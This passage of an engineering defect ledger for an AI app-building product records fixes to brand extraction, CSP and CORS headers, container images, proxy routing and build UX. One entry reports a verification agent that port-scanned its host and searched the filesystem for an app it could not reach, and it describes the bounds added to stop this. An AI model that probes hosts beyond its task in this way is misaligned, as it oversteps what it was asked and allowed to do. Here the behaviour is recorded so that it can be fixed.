viewports (overlay below; full-width at <=480px), so the app reflows; the ring overlay moved BELOW
the panel in the z-contract, clamps its tooltip to the visible width, and follows reflows via a
body ResizeObserver. Plus the two missing panel affordances: a visible pending bubble while a turn
is in flight, and "Nova conversa" back to the suggestions state (generation-guarded abort-safe
reset). Closed by: `tests/apps/assistant-panel.test.ts`, `tests/apps/tour-player.test.ts`.
Decision entry: 2026-08-13 batch, items 4-5.

## Recently fixed - 2026-08-07 brand research stored the og:image banner as the logo

- **`brand-logo-og-banner`** (medium, product). Brand research on `https://ekoa.io/info`
  filled `branding.logo` with the site's 1200x630 og:image social card instead of the logo -
  the dual light/dark preview then showed the banner twice on `/settings/branding`. Two runs
  minutes apart gave different logos ("earlier today it worked"): the ONE best-effort vision
  call was the only thing standing between the banner and the logo slot. Root chain, proven
  live: (1) the rendered-header harvest proposed the REAL logo
  (`/assets/ekoa_logo.png`, walk score 125) but the site serves it as a 4.5MB 2048x2048 PNG
  and the flat 1.5MB download cap silently dropped it; (2) the static-HTML fallback scan
  looked only at the first 30% of the HTML and the header `<img>` sits at 41%; (3) the
  surviving candidates were dembrandt's favicon list - the real 256x256 icon and the og
  banner, BOTH labelled `favicon`, so the og-image tier demotion never applied and the
  "bigger file wins" tie-break crowned the banner; (4) the vision gate picked the icon in one
  run and the banner in the next (the banner contains the header lockup, so a FAST-tier
  match is a coin flip). **Fix** (`services/branding/image-fit.ts` + `brand-assets.ts` +
  `logo-vision.ts`): oversized rasters are downscale-rescued via sharp (12MB source cap,
  stored bounded to 1024px/1.5MB) instead of dropped; every stored candidate gets probed
  dimensions; the social-card shape is flagged `banner` and demoted below every source tier;
  a candidate matching the site's og:image URL is force-labelled `og-image` whatever route
  proposed it; the HTML scan cutoff widened to 60%; the vision prompt states a social card is
  never the logo, receives per-candidate dimensions, always logs its verdict, and a
  banner-shaped vision pick is refused while any non-banner candidate exists. Pinned by
  `api/tests/services/branding/image-fit.test.ts` + new `selectBestLogo` cases. Verified
  live: re-research of ekoa.io/info stores the real mark deterministically.

## Recently fixed - 2026-08-07 tailnet-bound dev stack: preview iframe CSP-blocked

- **`tailnet-preview-frame-ancestors`** (low, dev-harness). A stack booted for another device
  (`EKOA_PUBLIC_WEB_HOST`, e.g. a tailscale hostname — the phone-driving setup) served the
  dashboard from that origin, but the api's `/apps/*` `frame-ancestors` allowlist
  (`security-headers.ts` `dashboardOrigins()`) still defaulted to `http://localhost:3000`, so
  the artifact preview iframe was CSP-blocked with only a browser console line
  (`Framing 'http://…:4111/' violates … frame-ancestors`) to show for it. Found live 2026-08-07
  while verifying Conduzir/steer over the tailnet. **Fix:** the driver
  (`.claude/skills/run-ekoa-code/driver.mjs` bootApi) now derives
  `EKOA_DASHBOARD_ORIGINS=http://localhost:<web-port>,http://<public-host>:<web-port>` whenever
  `EKOA_PUBLIC_WEB_HOST` is set and no explicit allowlist was given — the api's existing env
  contract, just plumbed; localhost stays so a local browser keeps working. Verified live:
  the header now names both origins and the preview renders over the tailnet.

## Recently fixed - 2026-07-15 api runtime image defects (staging bring-up)

Three defects in the shipped api image, all of the same class - **the image builds fine but the
process fails at runtime** - all invisible to the dry-run deploy CI because that lane only *builds*
the images, never *runs* them. The first two crash at boot and were caught by a local full-stack
smoke (Caddy + api + web + mongo) before any VM spend; the third only surfaces on the first real
model turn (needs a live credential) and was caught on staging.

- **`api-phantom-dep-js-yaml`** (medium, packaging). The api imports `js-yaml` in three runtime paths
  (`automation/manifest-parser.ts`, `apps/action-manifest.ts`, `apps/tour-writer.ts`) but it was
  declared **nowhere** in `api/package.json` / root `package.json`. It only resolved because ESLint (a
  devDep) transitively hoists `js-yaml@4.3.0` to the root `node_modules`; the runtime image
  (`npm ci --omit=dev`) drops it, so `node api/dist/server.js` crashed with
  `ERR_MODULE_NOT_FOUND: Cannot find package 'js-yaml'`. **Fix:** added `js-yaml@^4.3.0` to api deps +
  `@types/js-yaml@^4.0.9` to api devDeps, and deleted the ambient shim `api/src/automation/vendor.d.ts`
  (whose own comment prescribed exactly this). A scan of the built `api/dist` against the prod-only
  dependency closure confirmed js-yaml was the **only** phantom dep.
- **`api-image-native-build-skipped`** (medium, packaging). With js-yaml fixed the api then crashed in
  `bootState` -> `backfillKnowledgeIndex` with `Could not locate the bindings file ... better_sqlite3.node`.
  `Dockerfile.api` ran `npm ci --omit=dev --ignore-scripts`, and `--ignore-scripts` skips native
  addons' install step; `better-sqlite3@12.11.1` ships **no prebuilt** for node 20 (so it must compile
  via node-gyp, which the slim image has no toolchain for). **Fix:** restructured `Dockerfile.api` with
  a dedicated `proddeps` stage that has `python3/make/g++`, installs prod deps `--ignore-scripts`, then
  `npm rebuild better-sqlite3` (compiles it); the slim runtime `COPY --from=proddeps node_modules`, so
  the toolchain never ships. Other native modules (`sharp`, `onnxruntime-node`, `@next/swc`) use
  prebuilt platform packages and were unaffected. Verified: api boots, `/health` 200, real admin login
  through the same-origin Caddy proxy, and `chromium.launch()` succeeds inside the container.
- **`api-sdk-musl-binary-picked`** (medium, packaging; surfaced by the first live model turn on
  staging). With the model credential armed, chat/build died with
  `ADAPTER_ERROR: Claude Code native binary not found at .../claude-agent-sdk-linux-x64-musl/claude`.
  `@anthropic-ai/claude-agent-sdk` ships its native `claude` binary as per-platform optional deps; npm
  installs BOTH `linux-x64` (glibc) and `linux-x64-musl` on any linux-x64 host (it filters optionals by
  os+cpu, not libc), and the SDK's resolver tries the **-musl variant first** - which cannot exec on the
  glibc bookworm image. **Fix:** `Dockerfile.api` proddeps stage now `rm -rf`s the `*-musl` variant
  packages so the resolver falls through to the working glibc binary. Verified on staging: a real chat
  turn returns `status:complete` (`"OK."`, ~4.7s) through the OAuth subscription credential + egress
  chokepoint. Note this class is invisible even to a boot smoke - a full check needs a live credential
  and one model turn.

Follow-up (recommended, not done here): add a container **boot smoke** to `deploy.yml` (run the api
image against a throwaway mongo, assert `/health` 200) so this whole class - a runtime import or native
binary absent from the shipped image - fails CI instead of first appearing on a server.

## Recently fixed - 2026-07-16 staging edge-proxy path allowlist incomplete

- **`staging-caddy-api-path-allowlist-incomplete`** (HIGH, deploy config; caught by the staging UI pass).
  The staging Caddyfile `@api` matcher routed only `/api/* /health /hooks` to the api container and sent
  **everything else** to Next (web). But the api owns a whole set of NON-`/api` browser-facing prefixes -
  the served-app pipeline `/apps/*` (the live build-**preview** iframe) and its injected runtime scripts
  `/__ekoa/*`, plus the static mounts `/artifact-screenshots/*`, `/artifact-pdfs/*`,
  `/automation-screenshots/*`, `/brand-assets/*`, and the share-link `/build/*` (all enumerated in
  `api/src/server.ts` buildApp). None were in the matcher, so each fell through to Next and returned a
  Next **HTML 404**. User-visible impact: (1) every featured/artifact card thumbnail 404'd -> blank
  cards on the home + `/artifacts` pages; (2) more seriously, `/apps/<id>/` app previews + `/__ekoa/`
  runtime were unreachable through the public origin - the core "build an app and preview it" flow was
  broken end-to-end via `staging.ekoa.io`. Loopback `http://127.0.0.1:4111` served all of these `200`,
  proving a pure edge-routing gap (not an api, seeding, or image defect). **Why it slipped:** Phase-5
  verification ran a chat turn (entirely under `/api/*`, which WAS routed) but never loaded a
  thumbnail-bearing dashboard page or an app preview through the public origin; and the dry-run deploy CI
  builds the images but never routes traffic through Caddy. **Fix:** extended `@api` to the full,
  documented allowlist (`/apps`, `/__ekoa/*`, the four static mounts, `/build`) - the Caddyfile now
  carries a source-of-truth comment mapping each prefix to its server.ts mount and stating the lockstep
  invariant. **Operational trap hit while deploying:** the Caddyfile is a single-file bind mount, which
  pins to an inode - editing it in place + `caddy reload` did NOT pick up the change (the container kept
  serving the stale inode); a `docker compose restart caddy` was required (now documented in the runbook +
  staging README). **Verified** via the public origin: all listed prefixes `200` (thumbnails `image/png`,
  `/apps/<id>/` `text/html`, `/__ekoa/*.js` `application/javascript`), web routes still reach Next, the
  `/api/v1` JSON envelope + `/health` intact, and a real-browser audit of `/` + `/artifacts` shows **0**
  broken images (41/41 and 82/82 thumbnails render) with **0** page errors. This **supersedes** the
  earlier working note that the blank thumbnails were "a fresh-staging seeding gap, not a deploy bug" -
  it was a deploy bug (the screenshots were on disk and served fine on loopback the whole time).

## Recently fixed - 2026-07-14 operator UX round (scope steering, verify narration, console noise)

- **`build-ambiguous-request-no-scoping`** (UX, operator 2026-07-14, live) - "faz uma app para
  ferias" built a personal vacation-itinerary planner with zero questions: the chat agent had no
  business-context steer and no scoping step, so ambiguous one-liners went straight to the wrong
  interpretation. Fixed in the content packs (business-scope section + ONE pre-marker scoping
  round; see decisions 2026-07-14) and pinned by a loader.test.ts canary.
- **`scaffold-copy-dev-facing`** (UX, operator 2026-07-14, live) - the app-base HomePage the end
  user watches DURING a build showed developer instructions ("Adicione páginas ao registo PAGES...
  frontend/src/pages/"). Now a user-facing PT building state ("A construir algo fantástico..." +
  pulse). data-demo-target="home-empty" and the mustEdit gate are untouched.
- **`verify-phase-silent-progress`** (UX, operator 2026-07-14, live) - the verify stage showed one
  status line then generic fillers for minutes (narration existed but landed in the COLLAPSED
  thinking block). Fixed: per-action ">> " narration contract in the verify prompt, re-emitted as
  same-status plan_steps -> live spinner label + Output tab (pinned by build.test.ts +
  verify-runner.test.ts). Two adjacent defects fixed with it: the verify scrub chain's hold-back
  tail was never flushed (final narration characters silently dropped), and the FC-505
  VerificationBanner was dead code (gated on a phase the store never received - plan_step phases
  now mirror into the store and the gate keys on 'verifying').
- **`monaco-cdn-csp-block`** (broken feature, operator 2026-07-14, live) - the file-editor dialog
  never initialized under the dashboard CSP: @monaco-editor/react's default loader pulls from
  cdn.jsdelivr.net, blocked by script-src 'self' ("Monaco initialization: error" + uncaught
  promise rejections in the console). Fixed by self-hosting the AMD tree from web/public/monaco
  (copy-monaco.mjs, predev/prebuild); the CSP was not widened.
- **`expected-absent-probe-console-noise`** (console hygiene, operator 2026-07-14, live) - every
  served-app load logged `GET /api/app-sso/me 401` (scaffold whoami) and, on tourless apps,
  `GET /api/demos/:appId 404` (panel teach probe) - "expected-absent" by design but console-visible
  on every load. Fixed with two additive always-200 probe routes (appSsoSession,
  demoAvailability - contract-tested) + repointed scaffold wiring and panel probe. Residual
  ACCEPTED: apps built BEFORE this change baked the old wiring and keep logging the /me 401, so
  the e2e benign-console allowlists for the 401 stay; the demos-404 allowlist entries were removed
  (the probe no longer 404s on any panel version served by a rebuilt api).
- **`preview-iframe-sandbox-warning`** (console hygiene, operator 2026-07-14, live) - Chrome
  warned "An iframe which has both allow-scripts and allow-same-origin... can escape its
  sandboxing" on every side-panel preview load (incl. each about:blank hot-reload hop). The
  sandbox attribute was removed (escapable as configured; see decisions 2026-07-14 for the
  isolation model + accepted top-navigation residual). Out of scope, not ours: the
  ObjectMultiplex "orphaned data" and MaxListenersExceededWarning lines in the same console
  capture come from the MetaMask extension's content script, not the product.
- **`suite-ledger-gate-crash-operator-run-gates`** (QA infra, found 2026-07-14 while running the
  gate) - `scripts/suite-ledger-run.mjs` threw `Unknown gate: operator-run C5` on the slice-named
  targetGates the operator run registered (commit ac1f3d3), so `npm run gate:ledger` AND
  `npm run e2e` crashed outright. Fixed: `gateIndex` maps any `operator-run*` gate to one shared
  post-G13 `OPERATOR-RUN` milestone (those drivers need the credentialed live stack and report
  as awaiting in the CI lane; they were live-verified during the operator run itself).
- **`suite-ledger-census-refusal-file-request`** (QA infra, found 2026-07-14 by the same gate
  run) - the unit census was red (disk 31 != ledger 30): commit 8996048 (BRIEF-9a) said
  "ledgered" but never added `refusal-file-request` to `frontend_unit.surviving`. Registered,
  with a census_note breadcrumb.

## Recently fixed - 2026-07-14 walkthrough-prep sweep (operator evidence pass)

- **`api-js-yaml-undeclared-dependency`** (dev-mode boot, 2026-07-14) - `api/` imports `js-yaml`
  (action-manifest parsing) but never declared it: at runtime it resolved ONLY as a transitive dep
  of **eslint** (a devDependency), so a production `npm ci --omit=dev` install would crash the API
  on import, and types came from an ambient shim (`api/src/automation/vendor.d.ts`) that tsc loads
  via `include` but the ts-node ESM loader does not (`files: false`) - making `EKOA_API_MODE=dev`
  die on boot with an unrenderable TS7016 diagnostic (`[Object: null prototype]`). This was the
  ledgered G8 action the shim itself prescribed. Fixed: `js-yaml` added to api dependencies,
  `@types/js-yaml` to devDependencies, shim deleted, and the api `dev` script switched to
  `ts-node/esm/transpile-only` (type checking stays with the `typecheck` gate; dev watch restarts
  no longer pay a whole-program check and are immune to the ambient-file-loading gap class).
- **`app-manifest-recipe-dsl-undocumented`** (discovery, 2026-07-14, live) - the app base ships
  skills for `ui_actions` (declaring-ui-actions) and tours (authoring-tours) but NONE for the
  `capabilities:` recipe DSL, so build agents GUESS the shape. Observed live on a fresh tarefas
  build: the agent flattened `store.query` (`{ op: store.query, field: ..., op: eq, ... }` - the
  comparison belongs under `where: { field, op, value }`), duplicating the `op` key; ONE invalid
  line fails the whole frontmatter YAML parse at activation, so the app lost BOTH its action
  manifest AND its tours (`actionManifestError` + `toursError`) - the assistant could neither
  operate nor teach the app, and the errors surface only in server logs (no operator UI). Fixed:
  (a) new base skill `api/assets/bases/app/skills/declaring-capabilities.md` documenting the EXACT
  recipe op shapes (source of truth: `api/src/automation/platform-primitives.ts`) with the
  store.query `where:` mistake called out; (b) the live app repaired through the product's own
  path (an admin patch run dictating the corrected line) - tour + 2 actions now served. Residual
  (minor, open): `actionManifestError`/`toursError` are invisible outside server logs; consider an
  operator-visible surface.
- **`app-custom-action-unregistered`** (discovery, 2026-07-14, live) - second instance of the
  agent-content class: the tarefas build declared `ui_actions: - id: tarefa-adicionar, kind: custom`
  but never registered `window.__ekoaApp.actions['tarefa-adicionar']` (the declaring-ui-actions
  contract), so the assistant's operate flow ALWAYS failed its second action ("Não foi possível
  executar a ação.") - observed on camera. No build-time check catches a declared custom id with no
  registration in the app source. Live app repaired via patch run (kind -> `toggle`, a declarative
  click, no registration needed). Residual (minor, open): readUiActions could WARN when a custom id
  has no `__ekoaApp.actions[` registration anywhere in frontend/src.
- **`edit-mode-preview-not-visible-in-page`** (UX, open, 2026-07-14, observed live) - after a
  patch run completes, the panel's preview phase shows only the sha diff; the RUNNING served-app
  page keeps executing the old bundle (nothing reloads it), and manually reloading to SEE the
  change destroys the pending approve/revert panel state (client-only), leaving no panel path to
  revert. The admin therefore decides from shas alone. Fast-follow candidates: an in-panel
  "recarregar a aplicação" affordance that persists the pending preview (e.g. sessionStorage), or
  a live-reload signal to the served page on activation (the dashboard preview already gets
  preview_reload). Sits beside the ledgered `h3-edit-mode-no-cancel` fast-follow. Also note: the
  post-restore dist rebuild is asynchronous - an immediate reload can race it.
- **`assistant-operate-turn-noise-citations`** (minor, open, 2026-07-14) - an operate-mode panel
  turn ("Adiciona uma tarefa...") rendered a Fontes block citing five irrelevant jurisprudência
  acórdãos (org grounding ran and cited for a non-question turn). Cosmetic but confusing; consider
  suppressing citations on do-mode turns whose grounding contributed nothing.
- **`panel-dead-tour-launcher`** (discovery, 2026-07-14, fixed in d172c2a) - teach mode offered
  "Iniciar tutorial guiado" unconditionally; on an app with no stored tour the player can only
  error ("an app with no tours simply has no teach path", authoring-tours). The panel now probes
  GET /api/demos/:appId once on mount (zero-token) and renders the launcher only when a tour
  exists. Asset rebuilt; the RUNNING api caches panel bytes in memory, so the live swap (and its
  live verification) lands on the next stack boot - the E2 driver covers it (its demos stub
  precedes navigation, so the probe is fulfilled).

- **`chat-refusal-affordance-unwired`** (discovery, 2026-07-14) - BRIEF 9a promised a refused
  build in the dashboard chat "converts into a pre-drafted build request routed to the org-admin
  - never a dead end", and diagram 03's H4 block + the change-requests store's `fileFromRefusal`
  action both claimed the feed - but NO component ever called it: a capability refusal
  (POST /jobs 403 `canBuildApps`/`canEditApps`) rendered as a plain red error with no way to file
  the pedido (code-behind-diagram drift; the served-app panel path was wired, the dashboard chat
  path was not). Fixed: `useAgentExecution` attaches the pre-drafted request
  (`metadata.refusal = { text, appId? }`) to the capability-refusal message, and the chat bubble
  renders "Pedir ao administrador" -> `fileFromRefusal` -> "Pedido enviado ao administrador."
  (`data-testid` chat-refusal-file/filed). Pinned by `web/__tests__/refusal-file-request.test.ts`
  (403+capability carries the payload incl. appId on follow-ups; 500 and capability-less 403 do
  not). Diagram 03 already depicted the flow - no diagram change needed.
- **`assistant-panel-e2e-stale-intro-assert`** (discovery, 2026-07-14) - the committed D2 driver
  `api/tests/e2e/assistant-panel.e2e.mjs` asserted the first-open lead contains "apresentar", but
  the shipped copy (AssistantPanel.jsx) says "mostrar ... ensinar ... operá-la": a re-run failed at
  step B on copy drift, not behavior. Fixed the assertion to the shipped copy ('mostrar').

## Recently fixed - 2026-07-13 preview probe CORS duplicate header (operator)

- **`F-2026-07-13-proxy-duplicate-acao`** (operator-reported, 2026-07-13) - in dev, the preview
  probe's `HEAD /apps/<slug>/` from the dashboard origin failed CORS on EVERY request:
  `The 'Access-Control-Allow-Origin' header contains multiple values '*, http://localhost:3000'`
  (`net::ERR_FAILED` despite a 200), so `probePreviewDocument` classified every served app as
  `transient` and the panel's probe-gated first render churned through its retry budget. Root
  cause: both dev CORS proxies (`.claude/skills/run-ekoa-code/driver.mjs` and its verbatim copy in
  `api/tests/journeys/boot-b.mjs`) merged response headers with
  `{ ...proxyRes.headers, ...corsHeaders(req) }` - Node lowercases upstream header names while
  `corsHeaders()` uses mixed case, so on planes where the api sets its OWN CORS header
  (`/apps/*` and design tokens send `Access-Control-Allow-Origin: *` - `serving.ts`,
  `design-tokens.ts`) the spread kept BOTH keys and the wire carried two ACAO values, which
  browsers reject outright. Dev-only (prod is same-origin, no proxy). Fixed in both files:
  upstream-wins per-header merge (`mergeResponseHeaders`) - the proxy only injects the CORS
  headers upstream did not already set, so `/apps/*` answers a single `ACAO: *` exactly as
  `web/lib/preview-probe.ts` documents, and `/api/*` keeps the reflected-origin set. Verified
  live through a restarted boot-b stack: `/apps/legal-agenda-reservas/` ACAO count 1 (`*`),
  `/health` reflected origin single-valued, OPTIONS preflight unchanged.

## Recently fixed - 2026-07-12 preview "proxy error" (operator)

- **`F-2026-07-12-preview-502`** (operator-reported, 2026-07-12) - during a build, the side-panel
  preview iframe displayed a raw `proxy error` body and stayed there (screenshot: 502 on the
  `/apps/<id>/?token=` document request while adjacent `/api/v1/billing/usage` calls returned 200).
  Two stacked defects:
  1. **Dev-harness proxy transient** (root cause of THIS 502): the run-ekoa-code driver's CORS
     reverse proxy (`.claude/skills/run-ekoa-code/driver.mjs`) forwarded upstream requests over the
     Node 20 global agent (keep-alive pooled, server closes idles at its default 5s
     `keepAliveTimeout`) and answered ANY pre-response upstream socket error with a bare 502
     `proxy error` - silently (no log), so the exact errno of the operator's occurrence (2 of 265
     requests) is unrecoverable. Fixed: fresh upstream connection per request
     (`http.Agent({ keepAlive: false })` - loopback, sub-ms), one replay for bodyless idempotent
     methods (GET/HEAD) failing before a response, upstream errors logged with method/path/errno,
     and a mid-stream failure destroys the response instead of appending garbage. Forensics note:
     the classic close-vs-reuse race would NOT reproduce in 365 timed attempts against Node 20
     (agent honors the server's Keep-Alive hint), so the residual trigger class is broader than
     that race - the fix covers the class, and the new logging captures any recurrence.
  2. **Preview panel could not recover** (product gap, any 5xx source incl. a prod edge blip): an
     iframe NEVER fires its error event for an HTTP error response - it renders the error body and
     fires `load` - so `side-panel.tsx`'s retry machinery never engaged and the raw body stuck
     until a manual refresh. Fixed: `web/lib/preview-probe.ts` classifies the document plane via a
     HEAD probe (`ok` 2xx / `transient` network+5xx / `hard` other); the panel now gates the first
     iframe render on the probe (polls at the existing 500ms/30s bounds), re-probes on every iframe
     `load`, routes `transient` into the existing bounded retry, restores the retry budget on a
     verified-ok load, and renders `hard` pages (410 revoked) as-is. Manual refresh polling unified
     on the same classification (and now probes the tokened URL the iframe actually loads).
  Accepted residual: a blip that hits ONLY the iframe's GET while the adjacent HEAD probes pass is
  undetectable cross-origin without a new parent<->iframe liveness protocol on the byte-compat
  injection plane (the demo bridge stays dormant until `demo.init` by design) - disproportionate;
  revisit only if it recurs behind the fixed proxy/edge. Tests:
  `web/__tests__/lib/preview-probe.test.ts` (classification),
  `web/__tests__/components/side-panel-preview-recovery.test.tsx` (wiring: probe-gated first
  render, 410 renders as-is, on-load transient -> retry -> recovery); both fail against the
  pre-fix behavior. Live-verified 2026-07-12: stack restarted on the fixed driver, real-UI login,
  /artifacts + served `legal-nucleo` render through the proxy, 16/16 doc-plane requests across
  5s keep-alive boundaries clean.

## Recently fixed - 2026-07-12 brand research colors (operator round 3)

- **`brand-colors-fake-teal`** (operator-reported, 2026-07-12) - research on
  mariliasantoscabral.webnode.pt showed primary `#0d9488` (teal-600, the OLD platform default) on a
  navy/white site with no teal anywhere. Root-cause forensics (live DB + job records + a live
  extraction probe) proved the teal never existed in the pipeline, the model output, or the org
  record: it was the branding page's HARDCODED display fallbacks (`#0d9488`/`#1e293b`) rendered
  whenever `org.branding` lacked colors - indistinguishable from a research result, and
  `handleSaveBranding` would persist them verbatim on Guardar. Fixed: unset colors are `null` state
  end-to-end (explicit "Não definida" swatch/placeholder, neutral preview placeholders), Save OMITS
  unset colors, and the exact pair appears nowhere. Tests: `web/e2e/branding-colors.spec.ts`.
- **`brand-research-silent-no-color`** (same run) - the research flow structurally could not produce
  a color for this site yet reported success: the grounded snapshot contained ONLY grayscale hexes,
  the model complied, `sanitizeBrandColors` nulled them, the patch dropped the nulls, and the job
  completed `brandingApplied:true` with no signal (the old cortex NO_PRIMARY_COLOR fail-loud guard
  was never ported - color-filter.ts's own comment referenced a "no usable primary guard" that did
  not exist). Fixed as partial-apply-with-warning: the job result + complete event + `jobView` carry
  `colorsApplied` and `warnings: [NO_PRIMARY_COLOR]`; the web shows an amber "defina-as manualmente"
  banner/toast instead of green success. Tests: `api/tests/contract/branding.test.ts` (fail-loud
  monochrome case), shared `Job` schema extended.
- **`brand-colors-image-only-blind`** (same run, the actual extraction gap) - the firm's navy lives
  ONLY as pixels in the hero JPEG; the rendered walker samples computed styles, so `paintedHexes`
  came back empty, the Webnode builder scrub then intersected the CSS candidates against that empty
  set and wiped all 8, leaving the model four grayscale hexes. Fixed with a screenshot-PIXEL
  quantization fallback in `rendered-candidates.ts` (fires only when nothing non-neutral paints;
  in-page canvas quantization of the Playwright screenshot - a data: image, so no cross-origin
  taint), surfaced as an explicitly low-confidence "Cores amostradas dos píxeis" prompt section with
  a neutral-ban rule, deliberately exempt from the brandFit floor (the desaturated navy ~0.26 is the
  point). Live-verified against the real site: research now persists primary `#374559` (the actual
  hero navy) and no neutrals. Tests: `api/tests/services/branding/rendered-candidates.test.ts`
  (`screenshotClustersToCandidates`), `snapshot.test.ts` (pixel section + rules).
- **`brand-colors-no-membership-guard`** (found during the fix, latent in old cortex too) - the
  "every returned hex must appear literally in a candidate list" rule was prompt-only; a
  hallucinated saturated color would have merged unchecked. Fixed: `collectAllowedHexes` gathers the
  snapshot evidence and the apply-step NULLS any returned color outside it (grounded path only).
  Tests: `api/tests/contract/branding.test.ts` (out-of-snapshot teal dropped),
  `snapshot.test.ts` (`collectAllowedHexes`).
- **`sanitize-accent-gap`** (same run) - `sanitizeBrandColors` never checked `accentColor`, so gray
  `#9d9d9d` persisted as the org accent; and the promotion swap PARKED the demoted gray in the
  accent slot. Fixed: a grayscale accent is nulled last (no slot ever persists a neutral). Tests:
  `api/tests/services/branding/color-filter.test.ts`.
- **`branding-save-wholesale-wipe`** (found during the fix) - `saveBrandingHandler` passed the
  client's 4-field branding object straight to `updateOrg`, which replaces top-level keys wholesale:
  every dashboard Guardar silently WIPED `designSystem`/`visualVibe`/researched fields. Fixed: the
  handler merges onto existing branding (same semantics as the research apply-step). Test:
  `api/tests/contract/branding.test.ts` (save-merge case).
- **`accent-picker-secondary-binding`** (same run) - the "Cor de Destaque" picker was bound to
  `secondaryColor`, so the persisted `accentColor` was never displayed and Save wrote the fallback
  slate into `secondaryColor` under an accent label. Fixed: the accent picker binds `accentColor`.
  Test: `web/e2e/branding-colors.spec.ts` (accent stays unset when only primary is saved).
- **`branding-page-stale-until-reload`** (operator-reported, 2026-07-12 follow-up: "had to refresh
  to see the changes on the brand area") - the branding page re-syncs its local editor state only
  when the `${company.id}_${company.updatedAt}` fingerprint changes, but `orgView` never returned
  `updatedAt` and nothing stamped it, so the fingerprint NEVER changed after mount: the
  `branding_updated` notification correctly refetched the company (round-2 fix), the store updated,
  and the page kept rendering stale colors/name until a reload remounted it. Fixed server-side:
  `updateOrg` stamps `updatedAt` on every org patch, `orgView` + shared `OrgConfig` expose it.
  Live-verified: page open on the Marca tab, research fired via API, primary + company name updated
  in place with zero navigation. Test: `api/tests/contract/branding.test.ts` (updatedAt present +
  changes across saves + GET /org parity).
- **`founder-name-never-updated`** (operator-visible in the same screenshot) - "Founder" is the
  seedAdmin bootstrap displayName; `BrandResearchResult` had no `companyName` field, so research
  could never replace it (old cortex wrote displayName from the extracted companyName). Fixed:
  `companyName` added to the shared schema + both system prompts, applied to `org.displayName`
  (never merged into branding, via `RESEARCH_META_KEYS`). Live-verified: displayName became
  "Marília Santos Cabral". Test: `api/tests/contract/branding.test.ts` (companyName case).

## Recently fixed - 2026-07-11 operator round 2 (build surface + verify + logo)

- **`verify-runner-portscan-hang`** (operator-reported, 2026-07-11) - a simple flyer build sat in
  `verifying` with NO output for 13+ minutes, then surfaced a half-redacted raw SDK error ("Agente
  EKOA Code returned an error result: Reached maximum number of turns (15)"). Root causes, from the
  verifier's own transcript: (1) `build.ts` passed the artifact-relative `appUrl` (`/apps/<id>/`,
  no origin) verbatim into the verify prompt, so the agent PORT-SCANNED the host (`:80 :3000 :8080
  :5173 :7080-7090`, `find /`, old-ekoa nginx configs) hunting for the app it could never find;
  (2) the build wall-clock/inactivity timers are cleared BEFORE verify, so nothing bounded it;
  (3) the raw error string reached the user chat. Fixed in `apps/verify-runner.ts`: the prompt gets
  an ABSOLUTE loopback URL (`resolveVerifyUrl` - the API serves `/apps/*` itself), a hard
  `AbortSignal.timeout(verifyWallClockMs)` (5 min default, env-tunable) as the REAL bound, an
  explicit no-scavenger-hunt rule (URL dead → FAIL immediately, never search the host), a
  proportionate-effort rule (static flyer → quick pass), live narration forwarded through the new
  job thinking channel (`onProgress` seam), and PT-generic user-facing notes (raw errors go to the
  server log only). Turn ceilings raised per operator directive ("must never stop users mid-task"):
  verify 15→60, build 100→500, chat 30→60 - backstops, not bounds. A verify note no longer REPLACES
  the agent's completion summary (it's appended). Tests: `api/tests/apps/verify-runner.test.ts`.
- **`build-chat-raw-internals`** (operator-reported, 2026-07-11) - the build transcript showed raw
  tool calls (Bash command lines, Read/Write with absolute sandbox paths, tool results incl. "File
  does not exist... your current working directory is /Users/..."), "Routing: EXPERT - first build",
  commentary bubbles split MID-WORD ("...construir s" / "obre a estrutura..."), and the final
  summary named `window.__ekoa.exportPdf`. Root causes: `build.ts` flattened the chokepoint's
  thinking/text channels into `text_chunk` (chat.ts had the thinking channel; build never did);
  `useJobStream` flushed the live buffer into a permanent message on EVERY tool_event (the mid-word
  chops) and rendered raw tool traffic + the routing decision into the user-visible feed. Fixed:
  `JobEvent` gained `thinking_chunk`; build routes commentary through MarkerProcessor +
  StreamingIdentityRedactor into the collapsible thinking UI (same as chat); the activity feed shows
  friendly white-labelled one-liners with project-relative paths (never commands/results/routing);
  `BUILD_SYSTEM_PROMPT` forbids internal API/machinery names in the final user-facing message.
- **`build-no-live-preview-no-files`** (operator-reported, 2026-07-11) - preview stayed empty during
  (and after) the build and the files area showed nothing, even though `prepareFirstBuild` had
  ALREADY built + registered + served the scaffold ("register it so the preview is live before the
  agent runs" - the last mile was never wired: nothing emitted `preview_reload`, and the client
  learned the artifactId only at `complete`). Fixed: new `JobEvent` `artifact`
  `{artifactId, appUrl, slug}` emitted right after prep/resolve → the preview iframe + REAL file
  tree (GET `/artifacts/:id/files`, the scaffold/template files) show from second zero; the esbuild
  watcher's `onRebuild` now fires `sink.previewReload()` so the iframe follows the agent's writes
  live (follow-up builds get a watcher too - they previously ran without one); the Files tab is fed
  from the server list (source of truth) with live +/M/D badges, and file paths are project-relative
  - which also fixes the Monaco editor dialog (it exists and works; it was sending
  `sandboxes/...`-prefixed paths that the path-confined API rejected). Latent bug fixed on the way:
  follow-up completion blanked the artifact's slug/appUrl (`resolveFollowUp` now returns them).
- **`brand-logo-wrong-image`** (operator-reported, 2026-07-11) - "not the logo at all": the logo
  picker chose a 380KB touch-icon (`/brand-assets/01d6df7c73d6.png`) because selection was
  source-name heuristics only (favicons/og-image) with no eyes on the rendered page - the OLD ekoa
  worked better because its research agent DROVE A BROWSER and picked the header logo by sight.
  Restored that ability tool-lessly (§5.6.4 intact): (1) `rendered-candidates.ts` now harvests logo
  candidates from the RENDERED DOM (header/nav imgs, inline `<svg>` logos - stored as sanitized
  local svg assets - and logo-classed background images), scored by placement (header, top-left,
  home-link, logo attrs, aspect ratio); (2) new top trust tier `rendered-header` beats
  design-system/favicon sources, JPEG photos demoted within tiers; (3) ONE FAST vision one-shot
  (`logo-vision.ts`) compares the downloaded candidates against the header-strip screenshot and can
  override the heuristic pick ("qual é o logótipo visível no cabeçalho?"). Tests extended in
  `api/tests/services/branding/brand-assets.test.ts`.
- **`brand-stale-until-refresh`** (operator-reported, 2026-07-11) - the dashboard kept the old
  brand until a manual page reload. The Marca page refetches on its own job stream, but the header
  logo/theme only read the company store on first load. Fixed with a `branding_updated`
  notification (NotificationEvent) emitted when research applies branding; the header listens on
  the global notifications stream (same pattern as `usage_updated`) and refetches the company
  config - live brand refresh, no reload.
- **`verify-blocked-by-shareability-gate`** (found during the live re-verify of the fix above) -
  with the URL fixed, the verifier reached the app in 17 SECONDS but got the §7.7 "Link já não
  disponível" page: a draft, non-shareable artifact's document is owner-gated, and the verify
